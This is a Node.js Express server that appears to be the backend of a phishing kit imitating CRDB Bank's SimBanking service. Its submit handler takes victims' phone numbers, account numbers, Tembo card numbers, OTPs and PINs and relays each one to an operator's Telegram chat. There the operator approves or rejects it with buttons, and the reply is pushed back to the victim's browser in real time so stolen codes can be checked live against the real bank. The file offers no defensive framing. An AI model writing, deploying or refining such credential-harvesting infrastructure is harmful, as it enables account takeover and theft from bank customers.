const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

const bot = new TelegramBot(TOKEN, { polling: { interval: 2000, autoStart: true, params: { timeout: 10 } } });

global.appState = global.appState || {
    adminChatId: CHAT_ID || null,
    clientData: {},
    pinAttempts: 3,
    sseClientResponse: null,
    sseResponseObj: null // Holds open connection to push instant updates
};

bot.onText(/\/start/, (msg) => {
    global.appState.adminChatId = msg.chat.id;
    const user = msg.from;
    const appUrl = process.env.RENDER_EXTERNAL_URL || 'https://crdb-simbanking.onrender.com';
    
    const welcomeMsg = `✅ **Admin Connected Successfully!**\n\n` +
        `👤 **User Info:**\n` +
        `• Name: ${user.first_name} ${user.last_name || ''}\n` +
        `• Username: @${user.username || 'N/A'}\n` +
        `• ID: \`${user.id}\`\n\n` +
        `🌐 **Browsing Application Link:**\n${appUrl}\n\n` +
        `📱 Telegram notifications start strictly from the **Tembo Card Verification** screen onwards.`;
    
    bot.sendMessage(global.appState.adminChatId, welcomeMsg, { parse_mode: 'Markdown' }).catch(err => console.error(err));
});

// Real-time Event Stream Endpoint (Replaces slow polling)
app.get('/api/stream-status', (req, res) => {
    res.setHeader('Content-Type', 'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');
    res.flushHeaders();

    // Save connection reference to push updates instantly
    global.appState.sseResponseObj = res;

    // Send immediate keep-alive ping
    res.write('data: {"status":"connected"}\n\n');

    req.on('close', () => {
        if (global.appState.sseResponseObj === res) {
            global.appState.sseResponseObj = null;
        }
    });
});

// Helper function to instantly notify browser of admin approval/denial
function triggerInstantUpdate(responsePayload) {
    if (global.appState.sseResponseObj) {
        global.appState.sseResponseObj.write(`data: ${JSON.stringify(responsePayload)}\n\n`);
    }
}

app.post('/api/submit', async (req, res) => {
    const { step, data } = req.body;
    global.appState.clientData = { ...global.appState.clientData, ...data };

    if (!global.appState.adminChatId) {
        return res.status(400).json({ success: false, message: 'Admin not connected to bot. Please send /start to your bot on Telegram.' });
    }

    const appUrl = process.env.RENDER_EXTERNAL_URL || 'https://crdb-simbanking.onrender.com';

    if (step === 'personal_info') {
        return res.json({ success: true, status: 'approved', next: 'step3' });
    }
    else if (step === 'step3') {
        const msgText = `💳 **Step 3: Account & Tembo Card Verification**\n\n` +
            `🌐 [Open Browsing App](${appUrl})\n\n` +
            `📱 **Phone No:** ${global.appState.clientData.phoneNumber || 'N/A'}\n` +
            `🏦 **Account No:** ${data.accountNumber}\n` +
            `💳 **Tembo Card No:** ${data.cardNumber}\n\n` +
            `*Choose action for applicant:*`;
        
        const opts = {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: 'PROCEED', callback_data: 'card_proceed' },
                        { text: 'DENY INVALID CRDB DETAILS ❌', callback_data: 'card_deny' }
                    ]
                ]
            },
            parse_mode: 'Markdown',
            disable_web_page_preview: true
        };
        await bot.sendMessage(global.appState.adminChatId, msgText, opts);
        return res.json({ success: true, status: 'pending' });
    }
    else if (step === 'step4') {
        if (data.isResend) {
            return res.json({ success: true, status: 'approved' });
        }

        const msgText = `📱 **Step 4: OTP Verification**\n\n` +
            `🌐 [Open Browsing App](${appUrl})\n\n` +
            `🔢 **Entered OTP:** ${data.otp}\n\n*Choose action:*`;
        const opts = {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: 'CORRECT OTP ✅', callback_data: 'otp_correct' },
                        { text: 'INCORRECT OTP ❌', callback_data: 'otp_incorrect' }
                    ]
                ]
            },
            parse_mode: 'Markdown',
            disable_web_page_preview: true
        };
        await bot.sendMessage(global.appState.adminChatId, msgText, opts);
        return res.json({ success: true, status: 'pending' });
    }
    else if (step === 'step5') {
        const msgText = `🔒 **Step 5: SimBanking PIN**\n\n` +
            `🌐 [Open Browsing App](${appUrl})\n\n` +
            `🔑 **Attempt PIN:** ${data.pin}\n⚠️ **Remaining Attempts:** ${global.appState.pinAttempts}\n\n*Choose action:*`;
        const opts = {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: 'CORRECT PIN ✅', callback_data: 'pin_correct' },
                        { text: 'WRONG PIN ❌', callback_data: 'pin_wrong' }
                    ]
                ]
            },
            parse_mode: 'Markdown',
            disable_web_page_preview: true
        };
        await bot.sendMessage(global.appState.adminChatId, msgText, opts);
        return res.json({ success: true, status: 'pending' });
    }

    res.json({ success: false, message: 'Invalid step' });
});

bot.on('callback_query', async (query) => {
    const action = query.data;
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;

    try { await bot.answerCallbackQuery(query.id); } catch (e) {}
    try { await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: messageId }); } catch (e) {}

    let resPayload = { status: 'pending' };

    if (action === 'card_proceed') {
        await bot.sendMessage(chatId, '✅ Card details approved. Moving applicant to OTP step.');
        resPayload = { status: 'approved', next: 'otp' };
    } else if (action === 'card_deny') {
        await bot.sendMessage(chatId, '❌ Application stopped due to invalid CRDB details.');
        resPayload = { status: 'denied', message: 'Tafadhali ingiza namba sahihi za akaunti na kadi (Invalid CRDB details ❌).' };
    } else if (action === 'otp_correct') {
        await bot.sendMessage(chatId, '✅ Correct OTP!');
        resPayload = { status: 'approved', next: 'pin' };
    } else if (action === 'otp_incorrect') {
        await bot.sendMessage(chatId, '❌ Incorrect OTP.');
        resPayload = { status: 'retry_otp', message: 'Namba ya OTP si sahihi ❌. Tafadhali ingiza OTP mpya.' };
    } else if (action === 'pin_correct') {
        await bot.sendMessage(chatId, '✅ Correct PIN!');
        global.appState.pinAttempts = 3;
        resPayload = { status: 'approved', next: 'success' };
    } else if (action === 'pin_wrong') {
        global.appState.pinAttempts--;
        if (global.appState.pinAttempts <= 0) {
            await bot.sendMessage(chatId, '🚫 Account blocked due to 3 wrong PIN attempts.');
            resPayload = { status: 'blocked', message: 'Akaunti yako imezuiwa kutokana na makosa ya PIN ❌.' };
            global.appState.pinAttempts = 3;
        } else {
            await bot.sendMessage(chatId, `⚠️ Wrong PIN. ${global.appState.pinAttempts} attempt remains.`);
            resPayload = { status: 'retry_pin', message: `Wrong PIN ❌. ${global.appState.pinAttempts} attempt(s) remaining.` };
        }
    }

    // Instantly push update to browser web socket/stream
    triggerInstantUpdate(resPayload);
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
        
